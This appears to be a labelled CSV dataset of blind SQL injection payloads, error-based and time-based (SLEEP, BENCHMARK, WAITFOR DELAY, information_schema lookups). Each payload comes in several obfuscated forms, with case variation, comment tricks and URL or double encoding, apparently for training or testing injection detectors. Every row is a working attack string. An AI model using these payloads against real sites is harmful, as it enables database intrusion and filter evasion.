id%253D1%2527%2Band%2B%2528SELECT%2B1%252F0%2Bfrom%2Bdual%2Bwhere%2BCHAR%252897%2529%253D%2527a%2527%2529%2B%253B--%2B-,1,sqli_blind_error,case_var|comment_semicolon_comment,double_encoded,SQLI_BLIND_ERROR_002,eec78f8b3f0d410921e2d98e773d6f73,6776eecbd296357222f36d5ba007f18e,119
id%3D1%27++AND++IF%28%287%3D7%29%2C++%28SELECT++table_name++FROM++information_schema.tables%29%2C++0%29++%2F%2A,1,sqli_blind_error,comment_block_comment|ws_multi_space,url_encoded,SQLI_BLIND_ERROR_003,7d67020a2b8444ff6159c1bd0969d169,0424ae4c6640a52c0ba07551d08391aa,111
"id%3D1%27%20AND%20IF((ASCII(%27A')=65),%20(SELECT%20table_name%20From%20information_schema.tables),%200)%20--",1,sqli_blind_error,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_BLIND_ERROR_003,46388588a7f704d9278444352a22cee9,929a57be335a8c82d8f30b64267be65e,109
id%3D1%27%09AND%09IF%28%281%3D1%29%2C%09%28SELECT%09table_name%09from%09information_schema.tables%29%2C%090%29%09--,1,sqli_blind_error,case_var|comment_dash_dash|ws_tab,url_encoded,SQLI_BLIND_ERROR_003,d19d00655ac334389e1d4de614001849,cd85f1ce2f00f46c6d81c687fef8e432,115
id=1'/**/And/**/(SELECT/**/1/0/**/FROM/**/dual/**/WHEre/**/2>1)/**/%23,1,sqli_blind_error,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_BLIND_ERROR_002,e32a8ff63576b88bb2f74c93f26c8ed9,6d0eefd50b5cb56fd04145f7e6df4e53,70
id%3D1%27+AND+%28SELECT+1%2F0+FROM+dual+WHERE+%27a%27%3D%27a%27%29+%2F%2A,1,sqli_blind_error,comment_block_comment,url_encoded,SQLI_BLIND_ERROR_002,33fe37a46c66f11128e72e52952d8832,909a7ff54181a07819e3291d52c084c1,73
"id%3D1%27+AND+IF((7=7),+(SELECT+table_name+FROM+information_schema.tables),+0)+%2F*",1,sqli_blind_error,comment_block_comment|ws_plus,partially_encoded,SQLI_BLIND_ERROR_003,829d8a6a7cd5e7f71da5f4cdc6930c64,606d9a9f8bac3bc45152b111aac9edb6,83
id=1'+AND (SELECT 1/0 FROM dual WHERE+ASCII(%27A%27)%3D65) #,1,sqli_blind_error,comment_hash|ws_space,partially_encoded,SQLI_BLIND_ERROR_002,90b65266358561fd025b4cb790411177,d3d7bb6cd0af85931192c3d5e4cc2219,60
id%3D1%27%2F%2A%2A%2FaND%2F%2A%2A%2FcAsE%2F%2A%2A%2FWHen%2F%2A%2A%2F%28CHAR%2897%29%3D%27a%27%29%2F%2A%2A%2FThen%2F%2A%2A%2F1%2F0%2F%2A%2A%2Felse%2F%2A%2A%2F1%2F%2A%2A%2FEND%2F%2A%2A%2F%23,1,sqli_blind_error,case_var|comment_hash|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,cd00654c8f4cd6292273bd6c8a529e4b,7e1a86896b9df282b7d7d4eebd42eded,188
"id=1' And IF((CHAR(97)='a'), (SELECT table_name FROM information_schema.tables), 0) %23",1,sqli_blind_error,case_var|comment_url_hash,raw,SQLI_BLIND_ERROR_003,31779819f118a20f4766c53a2aa2400b,c7b4263f683a1a1abefefbfecbaa4bdc,87
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F1%2F0%2F%2A%2A%2FFROM%2F%2A%2A%2Fdual%2F%2A%2A%2FWHERE%2F%2A%2A%2FCHAR%2897%29%3D%27a%27%29%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_blind_error,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_002,ca24cf41bb63a0851f7deb7c4e101a1d,6e0150f9ad3575692685b4d0eaf21f66,178
id=1'	and	(SELECT	1/0	from	dual	where	CHAR(97)='a')	/*,1,sqli_blind_error,case_var|comment_block_comment|ws_tab,raw,SQLI_BLIND_ERROR_002,ebed3cad4d54aa0204cb93291ee51428,b74e3e4df5c3bebad434835d7da4b4dc,54
id=1%27++ANd+ (SELECT +1%2F0++from  dual +Where +CHAR(97)%3D%27a%27) +--,1,sqli_blind_error,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_BLIND_ERROR_002,dc573e9629d46e89d0623d2f7530f4bc,e8ac0f4eaab67987a0e4dd122aae2864,72
id%253D1%2527%2BAND%2BCAsE%2BWHEN%2B%2528ASCII%2528%2527A%2527%2529%253D65%2529%2Bthen%2B1%252F0%2BeLSe%2B1%2BEND%2B--,1,sqli_blind_error,case_var|comment_dash_dash,double_encoded,SQLI_BLIND_ERROR_001,07cd70feaaa69e1b5c1d9a8f55b330ca,1465278b89dfcd0a3c506c8646274078,118
id%253D1%2527%2BaNd%2B%2528SELECT%2B1%252F0%2Bfrom%2Bdual%2BwHere%2B7%253D7%2529%2B--%2B-,1,sqli_blind_error,case_var|comment_dash_dash_space,double_encoded,SQLI_BLIND_ERROR_002,a2204d10aca53d4ff98247707cbe48d1,123ea6ff577d93d98ce1fe02d4a47fff,89
id%253D1%2527%2B%2Band%2B%2BIF%2528%25287%253D7%2529%252C%2B%2B%2528SELECT%2B%2Btable_name%2B%2BFROM%2B%2Binformation_schema.tables%2529%252C%2B%2B0%2529%2B%2B%252F%252A,1,sqli_blind_error,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_BLIND_ERROR_003,12b3fd22e015818bcc23cc51a88482ac,e76d7b5516337bbefa2f7e7b39750e2f,169
id=1' AND CASE WHEN (ASCII('A')=65) THEN 1/0 ELSE 1 END %23,1,sqli_blind_error,comment_url_hash,raw,SQLI_BLIND_ERROR_001,f3f4581b4df5496b78f389ebe5dc1177,3f6b728e1f119e3d89f86db70f1af316,59
id=1%27+AND+(SELECT+1%2F0+FROM+dual+WHERE+ASCII('A')=65)+--,1,sqli_blind_error,comment_dash_dash|ws_plus,partially_encoded,SQLI_BLIND_ERROR_002,e0346c1211882701db5e4d3efda955c5,e74c2c6b8ba49d14a75e9df47f7f711b,59
id%3D1'+AND+(SELECT+1/0+FROM+dual+WHERE+'a%27='a%27)+%23,1,sqli_blind_error,comment_hash|ws_plus,partially_encoded,SQLI_BLIND_ERROR_002,6d492c0cdf271715808349169bb67342,f1bd3ed4fe9df63b074fa8d4f6b99b7f,56
id=1' And case+when (7%3D7)+Then+1/0+ElSE+1 END+--,1,sqli_blind_error,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_ERROR_001,7df6d5410dc750bf35123c495251f139,3be7981e2867030710d10536aa8c016a,50
id%3D1%27+AND+IF%28%287%3D7%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+%3B--+-,1,sqli_blind_error,comment_semicolon_comment,url_encoded,SQLI_BLIND_ERROR_003,321d01f5ccb5dc4c23c7af6f5eabfc55,e0d79cd99b3fde66a8bae8a5587adbd7,104
"id=1' ANd IF((1=1), (SELECT table_name FRoM information_schema.tables), 0) --",1,sqli_blind_error,case_var|comment_dash_dash,raw,SQLI_BLIND_ERROR_003,c518566150112a6fea63d7839caf89c6,67396f21d599a6f5641e45a2343f9d24,77
"id=1' AND IF((100<200), (SELECT table_name FROM information_schema.tables), 0) -- -",1,sqli_blind_error,comment_dash_dash_space|ws_space,raw,SQLI_BLIND_ERROR_003,63d1d8805a7486d4641aa9d044c6fe12,bc993a8b43802683a31aba90cad8be97,83
"id=1' AND IF(('a'='a'), (SELECT table_name FROM information_schema.tables), 0) ;-- -",1,sqli_blind_error,comment_semicolon_comment,raw,SQLI_BLIND_ERROR_003,63358c58d627e1003f75dbbf34b22b51,93bdfcfedfed6487e47407759241a5c0,84
id%3D1%27+AND+cAsE+WHEN+%281%3D1%29+THEN+1%2F0+Else+1+end+--,1,sqli_blind_error,case_var|comment_dash_dash|ws_space,url_encoded,SQLI_BLIND_ERROR_001,46f0f9ab142599c8c03da3ab110a53e0,21ffc580a46ab32005d29d251d0050ee,60
id=1%27%20AND%20cASE%20WHEN%20(CHAR(97)%3D'a')%20theN%201/0%20else%201%20end%20--,1,sqli_blind_error,case_var|comment_dash_dash|ws_url_space,partially_encoded,SQLI_BLIND_ERROR_001,82afbf4b9983fe90253072174a564d35,845fc3e7709f3b9ea8078ad810716976,81
id=1'/**/AND/**/(SELECT/**/1/0/**/FROM/**/dual/**/WHERE/**/2>1)/**/--/**/-,1,sqli_blind_error,comment_dash_dash_space|ws_comment_ws,raw,SQLI_BLIND_ERROR_002,47a6c27de42324534ead5555e57fd11e,4c71d008fb350adb085ad4b841f445cc,74
id%253D1%2527%2BAND%2BCASE%2BWHEN%2B%2528100%253C200%2529%2BTHEN%2B1%252F0%2BELSE%2B1%2BEND%2B%2523,1,sqli_blind_error,comment_hash|ws_space,double_encoded,SQLI_BLIND_ERROR_001,21df36ec8e5e531282996cfd15a88782,c1d1b944d253df8f3f371bb6f2c22e78,99
id%3D1%27%2520AND%2520%28SELECT%25201%2F0%2520FROM%2520dual%2520WHERE%2520100%3C200%29%2520--,1,sqli_blind_error,comment_dash_dash|ws_mixed_ws,url_encoded,SQLI_BLIND_ERROR_002,6974bc3b2b5392ff8c1ecf2eda52ae1d,43b1f638c9b33a52f8f88d0117b986ff,93
id%3D1%27+AND+IF%28%287%3D7%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+%23,1,sqli_blind_error,comment_hash,url_encoded,SQLI_BLIND_ERROR_003,74c8a500a8acccecbb17cfe00f76dd47,75c882ba7ab4ffb0961be3ab7ca02ab2,100
id%3D1%27%2520AND%2520IF%28%28LENGTH%28%27test%27%29%3D4%29%2C%2520%28SELECT%2520table_name%2520From%2520information_schema.tables%29%2C%25200%29%2520--%2520-,1,sqli_blind_error,case_var|comment_dash_dash_space|ws_url_space,url_encoded,SQLI_BLIND_ERROR_003,886a021d3aabe9ff47d917446334e915,5799335b6e511bba9366a15c68454f37,158
id%3D1%27+AND+CASE+WHEN+%287%3D7%29+THEN+1%2F0+ELSE+1+END+--,1,sqli_blind_error,comment_dash_dash|ws_space,url_encoded,SQLI_BLIND_ERROR_001,d2d35f9cdbb7e55eb75d99feb4fb9892,c6c23953759960b544214309867237f8,60
id%3D1'%2F%2A*%2FanD%2F**/(SELECT%2F%2A%2A/1%2F0%2F*%2A%2FFrom%2F%2A%2A/dual%2F%2A*%2FWhere/%2A%2A%2F100%3C200)/**%2F#,1,sqli_blind_error,case_var|comment_hash|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_002,36c905550704b2ec98b3e9de2eaa24cf,0ee804f591630bc00c5557dfd57faf40,118
id%3D1' AND+CASE WHEN (%27a%27%3D%27a')+THEN 1%2F0+ELSE+1+END+-- -,1,sqli_blind_error,comment_dash_dash_space,partially_encoded,SQLI_BLIND_ERROR_001,a46597e1a26a0e7e97ea390863313eef,5ce7f553176089c5f36d526acf467709,66
id%3D1%27+And+IF%28%28ASCII%28%27A%27%29%3D65%29%2C+%28SELECT+table_name+from+information_schema.tables%29%2C+0%29+%3B--+-,1,sqli_blind_error,case_var|comment_semicolon_comment,url_encoded,SQLI_BLIND_ERROR_003,69c78c485d0335262c109bec42adbfbe,855d49244add411f84506e6b8e5505fb,122
id%253D1%2527%2BAND%2BCASE%2BWHEN%2B%25282%253E1%2529%2BTHEN%2B1%252F0%2BELSE%2B1%2BEND%2B--,1,sqli_blind_error,comment_dash_dash,double_encoded,SQLI_BLIND_ERROR_001,adbe98d6b5af86d93c1b11b4ea9e00bb,eefb3a10e39027547701d008433c74b0,92
id%253D1%2527%2BAND%2BIF%2528%25287%253D7%2529%252C%2B%2528SELECT%2Btable_name%2BFROM%2Binformation_schema.tables%2529%252C%2B0%2529%2B--,1,sqli_blind_error,comment_dash_dash,double_encoded,SQLI_BLIND_ERROR_003,c128b15fa941570378ca00da34db2c17,2fdc4182cce783f1e3cd09198046a132,137
id%3D1%27+AND+caSe WHEN (%27a%27%3D%27a%27) then 1%2F0+else+1+eND %23,1,sqli_blind_error,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_BLIND_ERROR_001,49617073708c7cb89e07383728dc583f,adfc1af0922a910f46ebcd0ca23a1d88,69
id=1%27 AND (SELECT 1/0+FroM dual WHErE+LENGTH(%27test%27)%3D4) %23,1,sqli_blind_error,case_var|comment_hash,partially_encoded,SQLI_BLIND_ERROR_002,022a50fb9d43aa24380247ef8992621d,d6d7be822e6969a20ca97b5055297d54,67
"id%3D1%27%2F%2A*%2Fand%2F*%2A%2FIF((1%3D1),/%2A*/(SELECT%2F%2A*/table_name/%2A*/from%2F%2A*/information_schema.tables),/*%2A/0)/*%2A/%3B--%2F**%2F-",1,sqli_blind_error,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_003,d62eb61556efb52ea2f4b4825ea64e28,cdf7e64f20870251b49805107356625a,147
id=1%27+and (SELECT+1%2F0+frOM dual+WHERe 2%3E1)+%3B--+-,1,sqli_blind_error,case_var|comment_semicolon_comment|ws_space,partially_encoded,SQLI_BLIND_ERROR_002,3804cf47202fd4d41f0e3abb7ceed4aa,03ec0790e34b4d78bae7ffa92b0322fe,56
id%3D1%27+And+IF%28%287%3D7%29%2C+%28SELECT+table_name+From+information_schema.tables%29%2C+0%29+--,1,sqli_blind_error,case_var|comment_dash_dash,url_encoded,SQLI_BLIND_ERROR_003,44d527d4dda5e1b3af390090da8780bd,4b7d075ee83f7639357f0c355bf04fe7,99
id=1%27 And+case WhEN (1%3D1)+then+1%2F0+Else 1+End+%3B--+-,1,sqli_blind_error,case_var|comment_semicolon_comment,partially_encoded,SQLI_BLIND_ERROR_001,cf4e35ea2c5016520b3568dc4d4eb02d,738bf7e38f4feeeada4518d3cf230b84,59
id%3D1%27%2F%2A%2A%2FanD%2F%2A%2A%2FCASE%2F%2A%2A%2FWhen%2F%2A%2A%2F%28100%3C200%29%2F%2A%2A%2Fthen%2F%2A%2A%2F1%2F0%2F%2A%2A%2FElsE%2F%2A%2A%2F1%2F%2A%2A%2FEnd%2F%2A%2A%2F--,1,sqli_blind_error,case_var|comment_dash_dash|ws_comment_ws,url_encoded,SQLI_BLIND_ERROR_001,182b22d04f53f5521d1cfc80954dcdb5,f119d7dc31f57d291a1e5721746cd5f4,174
id=1%27 And+(SELECT 1%2F0 from dual+WHERE+2%3E1) %3B--+-,1,sqli_blind_error,case_var|comment_semicolon_comment,partially_encoded,SQLI_BLIND_ERROR_002,f5a38a3c15424fa14021366dd02851ef,0e0d47257645051cb9fa7347e47e2c4f,56
"id%3D1%27/*%2A%2Fand%2F**%2FIF((CHAR(97)=%27a'),%2F%2A*/(SELECT%2F%2A%2A/table_name%2F%2A%2A/from/%2A%2A%2Finformation_schema.tables),%2F**%2F0)%2F%2A%2A%2F%2F*",1,sqli_blind_error,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_BLIND_ERROR_003,8ac5a715545be00b45951eeb4bac093a,fe495f625fb2515f62492b62a295e8c3,160
id%3D1%27++anD++IF%28%28CHAR%2897%29%3D%27a%27%29%2C++%28SELECT++table_name++From++information_schema.tables%29%2C++0%29++%2F%2A,1,sqli_blind_error,case_var|comment_block_comment|ws_multi_space,url_encoded,SQLI_BLIND_ERROR_003,74e056f06038497c646a95313d775289,f34b032e9c3448087c19c4dc9ae26093,128
id%3D1%27+AND+IF%28%28100%3C200%29%2C+%28SELECT+table_name+FROM+information_schema.tables%29%2C+0%29+--+-,1,sqli_blind_error,comment_dash_dash_space,url_encoded,SQLI_BLIND_ERROR_003,7dc886f2cd42cd3368700e5b0ba45d83,a2b8a9c152b7d0712458faffbe231cc0,105
id%253D1%2527%2Band%2BIF%2528%2528CHAR%252897%2529%253D%2527a%2527%2529%252C%2B%2528SELECT%2Btable_name%2BFROM%2Binformation_schema.tables%2529%252C%2B0%2529%2B--%2B-,1,sqli_blind_error,case_var|comment_dash_dash_space,double_encoded,SQLI_BLIND_ERROR_003,098b3229009898ec296ce9410843b62b,5a1c0e312b936a57bd54493e5c26f5c1,166
id=1' AND (SELECT 1/0 FROM dual WHERE ASCII('A')=65) ;-- -,1,sqli_blind_error,comment_semicolon_comment,raw,SQLI_BLIND_ERROR_002,995d2997f0a0980fab6565f4619a2e50,92f6f23eb94c78c3c102a0f23a2651aa,58
id%3D1%27	and	Case	when	(LENGTH('test')%3D4)	Then	1%2F0	ELSE	1	ENd	%2F%2A,1,sqli_blind_error,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_BLIND_ERROR_001,b18ba46c4e4ff98c1af969f6bb2e6f92,d0624972b062716b87369d285536bf06,73
id%3D1%27+aND+%28SELECT+1%2F0+From+dual+WHERE+2%3E1%29+--,1,sqli_blind_error,case_var|comment_dash_dash,url_encoded,SQLI_BLIND_ERROR_002,48109353de8039ed843f5fcc46b9cf1e,7c280b834169c9555c4301a5e043ac98,57
id=1%27++AND +(SELECT++%2A  FROM +(SELECT(SLEEP(1)))a)++--,1,sqli_blind_time,comment_dash_dash|ws_multi_space,partially_encoded,SQLI_BLIND_TIME_004,44d8a1a7b7c52fc53f0a378fc88b3d68,1def7a434312307041f685e235dce268,58
id%3D1%27+AND+SLEEP(1)+--,1,sqli_blind_time,comment_dash_dash|ws_plus,partially_encoded,SQLI_BLIND_TIME_001,42d4a51623bf4194dc3ad130e30e83ff,d28e296d1fa88ee8f296849f49330a8a,25
"id=1' and BENCHMARK(5000000, MD5(1)) #",1,sqli_blind_time,case_var|comment_hash,raw,SQLI_BLIND_TIME_002,6c14dbb2307236b70a46475a3d3ac5b4,b7f668f65d851f1963e6c29c0dc115da,38
"id=1' AND BENCHMARK(5000000, MD5(1)) ;-- -",1,sqli_blind_time,comment_semicolon_comment,raw,SQLI_BLIND_TIME_002,2c3ce7f3993f8474da38cc7ed1f2b964,f8567a165ab314afffd7d3be9dc36236,42
id%253D1%2527%2B%2Band%2B%2BIF%2528%2528ASCII%2528%2527A%2527%2529%253D65%2529%252C%2B%2BSLEEP%252810%2529%252C%2B%2B0%2529%2B%2B--,1,sqli_blind_time,case_var|comment_dash_dash|ws_multi_space,double_encoded,SQLI_BLIND_TIME_003,26758534f653f2ab0eb57a1218591873,06c77d99c2304f7a0657757be26158b9,131
"id=1' And IF(('a'='a'), SLEEP(10), 0) /*",1,sqli_blind_time,case_var|comment_block_comment,raw,SQLI_BLIND_TIME_003,029cf42db19db16ffa4618a477b4804f,9b4e63b50502f950eee8a8cb3c213935,40
id%253D1%2527%252F%252A%252A%252FAnD%252F%252A%252A%252FWAITFOR%252F%252A%252A%252FDELAY%252F%252A%252A%252F%25270%253A0%253A1%2527%252F%252A%252A%252F--%252F%252A%252A%252F-,1,sqli_blind_time,case_var|comment_dash_dash_space|ws_comment_ws,double_encoded,SQLI_BLIND_TIME_005,f2e8138956177da5ca47a58beaf055e8,52d12ea67bd9c0d76dffbfe8f248d18d,174
id%3D1'+And (SELECT+%2A+From+(SELECT(SLEEP(2)))a)+#,1,sqli_blind_time,case_var|comment_hash,partially_encoded,SQLI_BLIND_TIME_004,4546d7806b3b5d5ee168937e6f442d09,9352835c51d5eb5ea45345718e8a36d0,51
id%253D1%2527%2BAND%2BIF%2528%2528LENGTH%2528%2527test%2527%2529%253D4%2529%252C%2BSLEEP%252810%2529%252C%2B0%2529%2B%252F%252A,1,sqli_blind_time,comment_block_comment,double_encoded,SQLI_BLIND_TIME_003,bcdba421efacfa8bba285ea8235842e9,4bf7250a680b39df21dbec4ef83367a9,127
id%253D1%2527%2BAND%2BWAITFOR%2BDELAY%2B%25270%253A0%253A10%2527%2B%252F%252A,1,sqli_blind_time,comment_block_comment,double_encoded,SQLI_BLIND_TIME_005,9b40c84ccc292f1e9e33caec8150ef84,967dd843d7ce0d059f728688c37fddf8,77
"id=1'/**/And/**/IF((CHAR(97)='a'),/**/SLEEP(10),/**/0)/**/--/**/-",1,sqli_blind_time,case_var|comment_dash_dash_space|ws_comment_ws,raw,SQLI_BLIND_TIME_003,39a619c9dccd1ce8c754dd1b0c376ddb,cb7a039675da7c0728a4345b91c99ffa,65
id=1'+and+WAITFOR+DELAY+'0:0:2'+--+-,1,sqli_blind_time,case_var|comment_dash_dash_space|ws_mixed_ws,raw,SQLI_BLIND_TIME_005,00b9dc3d42c1f457e3306c987c4b036d,78ee19c9a9d7150363f7dda6d68663ad,36
id%3D1%27%09AND%09%28SELECT%09%2A%09FROM%09%28SELECT%28SLEEP%2810%29%29%29a%29%09%2F%2A,1,sqli_blind_time,case_var|comment_block_comment|ws_tab,url_encoded,SQLI_BLIND_TIME_004,c4a4fea4f2ebf71c4187463bbd15d1aa,55ebe5034c04e38d82951b7aefabcc18,87
id%3D1%27+AnD+BENCHMARK%285000000%2C+MD5%281%29%29+%23,1,sqli_blind_time,case_var|comment_hash,url_encoded,SQLI_BLIND_TIME_002,75cb3215fc5238842438243441a60cd1,69a7ebb2332d3c373e5b8439bc8094bb,54
"id=1%27++And  BENCHMARK(5000000, +MD5(1))++/*",1,sqli_blind_time,case_var|comment_block_comment|ws_multi_space,partially_encoded,SQLI_BLIND_TIME_002,65ee101341608b2bc56652c99bc73e41,e8eff4e71f3980fbf4c8f6ad80cbe148,45
id%253D1%2527%2Band%2BSLEEP%252810%2529%2B%252F%252A,1,sqli_blind_time,case_var|comment_block_comment,double_encoded,SQLI_BLIND_TIME_001,b8e8c383783f5b61b0f4d0c6e27994cc,e1f0c44cb1cf98a6a50756627614b162,52
"id%3D1%27+ AND +IF((100%3C200), +SLEEP(5),+ 0) +--",1,sqli_blind_time,comment_dash_dash|ws_multi_space,partially_encoded,SQLI_BLIND_TIME_003,7216ac9d9bb66d0a41b970473903a7da,7f46b074029014cd4749eb7c5b5ad967,50
id%3D1%27%2520AND%2520IF%28%28ASCII%28%27A%27%29%3D65%29%2C%2520SLEEP%285%29%2C%25200%29%2520--%2520-,1,sqli_blind_time,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_BLIND_TIME_003,cd99c742a7c0f61e659681fa7b3ad4f4,5d8a4a71248004d3b4f3c07d5036ebbd,101
id%253D1%2527%2509AND%2509WAITFOR%2509DELAY%2509%25270%253A0%253A2%2527%2509%2523,1,sqli_blind_time,comment_hash|ws_tab,double_encoded,SQLI_BLIND_TIME_005,47f5b62d0c138d903eb4fdc618d7f8d8,d611fa329a773fbb9e77c29051b858be,81
id%3D1%27++aND++BENCHMARK%285000000%2C++MD5%281%29%29++%2523,1,sqli_blind_time,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_BLIND_TIME_002,c1018d38ab0b5d3a6c9dd68cba326f9c,e13ccc5718088802b6734f656dc7e513,60
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252F%252A%252F%252A%252A%252FFROM%252F%252A%252A%252F%2528SELECT%2528SLEEP%25282%2529%2529%2529a%2529%252F%252A%252A%252F%252523,1,sqli_blind_time,comment_url_hash|ws_mixed_ws,double_encoded,SQLI_BLIND_TIME_004,2656bab7063c867c66916b052fcfa578,9b5d1214b7fa56d8e8496ce48b514af1,211
id=1' and WAITFOR DELAY '0:0:10' %23,1,sqli_blind_time,case_var|comment_url_hash,raw,SQLI_BLIND_TIME_005,c7d812957631f2b761afc0d18905ea95,0f05558c9051fbaddb15517f5c8b13ef,36
id%3D1%27+And+SLEEP%282%29+--+-,1,sqli_blind_time,case_var|comment_dash_dash_space,url_encoded,SQLI_BLIND_TIME_001,8fdc1df38cd74b5edce5b6859e0b9b61,213420d90df8607d8f42e64971d075d0,31
id%253D1%2527%2BAND%2BSLEEP%25285%2529%2B%252F%252A,1,sqli_blind_time,case_var|comment_block_comment,double_encoded,SQLI_BLIND_TIME_001,527684c4be4f6e6f05b9b2c93a4bda92,43ad020873f5249e8b7b64bca29a7ceb,51
id%253D1%2527%2509and%2509WAITFOR%2509DELAY%2509%25270%253A0%253A10%2527%2509%253B--%2509-,1,sqli_blind_time,case_var|comment_semicolon_comment|ws_tab,double_encoded,SQLI_BLIND_TIME_005,4ec804bd37a7b2a3998ab3f9a933333e,d6f3c85d35f73e4642652a27cd9103ea,90
"id=1'	aND	IF((1%3D1),	SLEEP(2),	0)	--",1,sqli_blind_time,case_var|comment_dash_dash|ws_tab,partially_encoded,SQLI_BLIND_TIME_003,082d7a0ccbfe7926eac0e9f6d57d3eac,5a531b25b66e342b0f012502c1d8fc73,37
id%253D1%2527%2509And%2509SLEEP%25285%2529%2509--,1,sqli_blind_time,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_BLIND_TIME_001,4b9fdae444ae3a1a0dd50534237cbbbb,ad3b3448b48f76526cd915d36443025f,49
id%3D1%27+And+IF%28%28LENGTH%28%27test%27%29%3D4%29%2C+SLEEP%281%29%2C+0%29+%2523,1,sqli_blind_time,case_var|comment_url_hash,url_encoded,SQLI_BLIND_TIME_003,d5f95dd5c4ec74daf5235272a399a788,126f47b1eb1d1ba10472887fa38d9ed0,81
id=1'%20AND%20SLEEP(1)%20%23,1,sqli_blind_time,comment_url_hash|ws_url_space,raw,SQLI_BLIND_TIME_001,6189347f2dd67f6c0d8d08485708b27f,daf697762d741e1ba8ac1cdb144f72d1,28
"id%3D1' AND+IF((1%3D1),+SLEEP(10), 0) %2F%2A",1,sqli_blind_time,case_var|comment_block_comment,partially_encoded,SQLI_BLIND_TIME_003,727c1c95f24ed0d06ab35d8f4a48276d,f0d6bf623e3b83d4c5234a380fb31ba7,44
id%253D1%2527%2B%2BAND%2B%2BWAITFOR%2B%2BDELAY%2B%2B%25270%253A0%253A10%2527%2B%2B--,1,sqli_blind_time,comment_dash_dash|ws_multi_space,double_encoded,SQLI_BLIND_TIME_005,67fac7551cbcab49ab61056734276cd3,f830d76d8eb682ef4fcfafb0dd602c1f,84
id=1%27+ And++(SELECT++%2A++FROM++(SELECT(SLEEP(2)))a)++--  -,1,sqli_blind_time,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_BLIND_TIME_004,7595dd3c44922d3aa1abd8fdc8f4bc71,71d1d5382050bba6cacc5b899bdac21a,61
"id=1'	and	IF((CHAR(97)='a'),	SLEEP(5),	0)	%23",1,sqli_blind_time,case_var|comment_url_hash|ws_tab,raw,SQLI_BLIND_TIME_003,6351a8bb41d5d4f742dad6f4e28be739,e14481983a88a2f892e7f56f64df06d2,45
"id=1%27+And IF((2%3E1),+SLEEP(5), 0)+%23",1,sqli_blind_time,case_var|comment_url_hash,partially_encoded,SQLI_BLIND_TIME_003,f11c731ce65a973ce79c75b5f1a5026f,96100b9651e578ebcde302660803c350,40
id%253D1%2527%2BAND%2B%2528SELECT%2B%252A%2BFROM%2B%2528SELECT%2528SLEEP%25282%2529%2529%2529a%2529%2B%252523,1,sqli_blind_time,comment_url_hash,double_encoded,SQLI_BLIND_TIME_004,7e94d8d6d0727a0fd3fdb039b3be76ee,d18bbf5c317580d0aec4f89b53ef7ed8,109
id=1'+And (SELECT+%2A+FROM+(SELECT(SLEEP(2)))a) -- -,1,sqli_blind_time,case_var|comment_dash_dash_space,partially_encoded,SQLI_BLIND_TIME_004,49658c72145cadbf1e39acab94d89126,c7ec501976a0b4b4feaee0c62f580fb5,52
id%3D1%27+AND+WAITFOR+DELAY %270:0:1%27+--+-,1,sqli_blind_time,comment_dash_dash_space,partially_encoded,SQLI_BLIND_TIME_005,9ceb4fe2ec1931f066c1b166c42c42fa,77e25adbb93a18f6ddfab6f70ec7adb1,44
id%3D1%27+and+IF%28%281%3D1%29%2C+SLEEP%2810%29%2C+0%29+%2523,1,sqli_blind_time,case_var|comment_url_hash,url_encoded,SQLI_BLIND_TIME_003,eb2db055bf0cc8b90f51dc42d92d8ff1,1ad0de96a452b0ece3cbc51cb89d1b08,61
"id%3D1'++AND +IF((LENGTH(%27test%27)=4),+ SLEEP(5),  0) +--  -",1,sqli_blind_time,comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_BLIND_TIME_003,ec2548dd76d33f71a89ec683a824bd37,75f0115719c27aa2ee43048612da48c3,62
id%253D1%2527%2BAND%2BIF%2528%2528100%253C200%2529%252C%2BSLEEP%25282%2529%252C%2B0%2529%2B%2523,1,sqli_blind_time,case_var|comment_hash,double_encoded,SQLI_BLIND_TIME_003,1741c3eb29dfcff40127f8289bab7509,653fea546ef0554851cd076a0ef898f7,96
id%3D1%27%09AND%09WAITFOR%09DELAY%09%270%3A0%3A1%27%09%3B--%09-,1,sqli_blind_time,comment_semicolon_comment|ws_tab,url_encoded,SQLI_BLIND_TIME_005,53574db148f2a206596d5d9642d488ac,e4239446c7f8d9201e518f83455241c7,63
id%3D1%27%20AND%20WAITFOR%20DELAY%20%270:0:10%27%20%2F*,1,sqli_blind_time,comment_block_comment|ws_url_space,partially_encoded,SQLI_BLIND_TIME_005,06c0a4f77f95c4f0bf9d4457766a8412,20643c98bcabf1ce0144726952837b23,55
id=1' AND WAITFOR DELAY '0:0:1' ;-- -,1,sqli_blind_time,comment_semicolon_comment,raw,SQLI_BLIND_TIME_005,4ad9fe49f7d70606f64c881b571a694c,7c26795c3889055b265bea993a73569a,37
id%253D1%2527%2BAND%2BWAITFOR%2BDELAY%2B%25270%253A0%253A10%2527%2B%252523,1,sqli_blind_time,comment_url_hash,double_encoded,SQLI_BLIND_TIME_005,ee50d91e07e7efb70b69e3091397b91e,65cea988666be5ba19232abadde0cad7,74
id=1'+AND+WAITFOR DELAY %270:0:5%27 -- -,1,sqli_blind_time,comment_dash_dash_space,partially_encoded,SQLI_BLIND_TIME_005,672f65e29dd89e40899a776ea288b71a,5099ce496705d48739b301aa8ed3e74d,40
